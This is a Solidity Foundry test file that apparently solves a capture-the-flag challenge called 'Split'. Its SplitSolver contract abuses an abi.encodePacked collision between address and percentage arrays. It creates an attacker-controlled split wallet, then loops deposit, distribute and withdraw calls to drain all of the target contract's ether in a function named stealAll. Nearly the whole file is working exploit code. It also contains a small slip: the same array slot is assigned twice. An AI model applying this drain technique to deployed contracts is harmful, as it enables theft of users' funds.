// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import "src/Split.sol";
import "src/SplitChallenge.sol";

contract SplitTest is Test {
    Challenge challenge;
    SplitSolver solver;
    Split split;
    // default wallet
    uint id = 0;
    uint32 relayerFee = 0;
    address[] accounts = new address[](2);
    uint32[] percents = new uint32[](2);
    IERC20 ethToken = IERC20(address(0));

    function setUp() public {
        split = new Split();
        vm.deal(address(0x1111), 100 ether);
        vm.startPrank(address(0x1111));
        accounts[0] = address(0x000000000000000000000000000000000000dEaD);
        accounts[0] = address(0x000000000000000000000000000000000000bEEF);
        percents[0] = 5e5;
        percents[1] = 5e5; //500000

        id = split.createSplit(accounts, percents, 0);

        Split.SplitData memory splitData = split.splitsById(id);
        splitData.wallet.deposit{value: 100 ether}();

        challenge = new Challenge(split);
        solver = new SplitSolver(challenge);
        vm.deal(address(solver), 50 ether);
        vm.stopPrank();
    }

    function testSolve() public {
        console.log("testing solve");
        solver.solve();
        assertTrue(challenge.isSolved());
    }

    function testPull() public {
        console.log("currentAddress: %s", address(this));
        console.log("test");
        console.log("id: %s", id);
        //distribution
        split.distribute(id, accounts, percents, relayerFee, ethToken);

        //wallet
        console.log(
            "wallet balance: %e",
            address(split.splitsById(id).wallet).balance
        );
        console.log("Split balance: %e", address(split).balance);

        console.log("generating my own wallet");

        address[] memory attackers = new address[](2);
        attackers[0] = address(this);
        attackers[1] = address(uint160(uint(type(uint32).max)));

        split.createSplit(attackers, percents, relayerFee);
        split.splitsById(1).wallet.deposit{value: 0.1 ether}();
        address[] memory fakeAccounts = new address[](1);
        uint32[] memory fakePercent = new uint32[](3);
        fakeAccounts[0] = address(this);
        fakePercent[0] = type(uint32).max;
        fakePercent[1] = 5e5;
        fakePercent[2] = 5e5;
        split.distribute(1, fakeAccounts, fakePercent, relayerFee, ethToken);
    }

    // function testDistributeSteal() public {
    //     address[] memory attackers = new address[](2);
    //     console.log("currentAddress: %s", address(this));
    //     attackers[0] = address(this);
    //     attackers[1] = address(this);
    //     uint32[] memory attackerPercents = new uint32[](2);
    //     attackerPercents[0] = 5e5;
    //     attackerPercents[1] = 5e5;//500000
    //     uint32 fee = 0;

    //     emit log_named_bytes("encode addresses", abi.encodePacked(attackers));
    //     emit log_named_bytes("encode percents", abi.encodePacked(attackerPercents));
    //     bytes memory encoded = abi.encodePacked(attackers, attackerPercents, fee);
    //     emit log_named_bytes("default encode", encoded);
    //     emit log_named_bytes32("hashing encode:", keccak256(encoded));
    // }
    // function testDistributeSteal2() public {
    //     address[] memory attackers = new address[](1);
    //     console.log("currentAddress: %s", address(this));
    //     attackers[0] = address(this);
    //     // attackers[1] = address(this);
    //     uint[] memory attackerPercents = new uint[](3);
    //     attackerPercents[0] = uint(uint160(address(this)));
    //     attackerPercents[1] = 5e5;
    //     attackerPercents[2] = 5e5;//500000
    //     uint32 fee = 0;

    //     emit log_named_bytes("encode addresses", abi.encodePacked(attackers));
    //     emit log_named_bytes("encode percents", abi.encodePacked(attackerPercents));
    //     bytes memory encoded = abi.encodePacked(attackers, attackerPercents, fee);
    //     emit log_named_bytes("default encode", encoded);
    //     emit log_named_bytes32("hashing encode:", keccak256(encoded));
    // }
}

contract SplitSolver {
    Split public split;
    Challenge public challenge;

    IERC20 public ethToken = IERC20(address(0));

    uint public myWalletId;

    constructor(Challenge _challenge) payable {
        challenge = _challenge;
        split = _challenge.SPLIT();
    }

    function pullAllToken() public {
        // get all tokens from default challenge wallet
        address[] memory accounts = new address[](2);
        uint32[] memory percents = new uint32[](2);
        accounts[0] = address(0x000000000000000000000000000000000000dEaD);
        accounts[0] = address(0x000000000000000000000000000000000000bEEF);
        percents[0] = 5e5;
        percents[1] = 5e5; //500000
        split.distribute(0, accounts, percents, 0, ethToken);
    }

    function stealAll() public {
        address[] memory fakeAccounts = new address[](1);
        uint32[] memory fakePercent = new uint32[](3);
        fakeAccounts[0] = address(this);
        fakePercent[0] = type(uint32).max;
        fakePercent[1] = 5e5;
        fakePercent[2] = 5e5;
        while (address(split).balance > 0) {
            //send all my token to my wallet
            split.splitsById(myWalletId).wallet.deposit{value: address(this).balance}();
            split.distribute(1, fakeAccounts, fakePercent, 0, ethToken);
            // withdraw all my token
            withdrawAll();
        }
    }

    function withdrawAll() public {
        uint currentBalance = split.balances(address(this), address(ethToken));
        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = ethToken;
        uint[] memory amounts = new uint[](1);
        amounts[0] = currentBalance;

        if (address(split).balance < currentBalance) {
            amounts[0] = address(split).balance;
        }

        split.withdraw(tokens, amounts);
    }
    function genWallet() public {
        
        
        address[] memory attackers = new address[](2);
        attackers[0] = address(this);
        attackers[1] = address(uint160(uint(type(uint32).max)));
        uint32[] memory percents = new uint32[](2);
        percents[0] = 5e5;
        percents[1] = 5e5; //500000
        //gen my own wallet
        myWalletId = split.createSplit(attackers, percents, 0);
    }
    function solve() public {
        require(challenge.isSolved() == false, "already solved");
        require(address(this).balance > 0, "no balance");
    
        genWallet();
        pullAllToken();
        stealAll();
    }

    receive() external payable {}
}
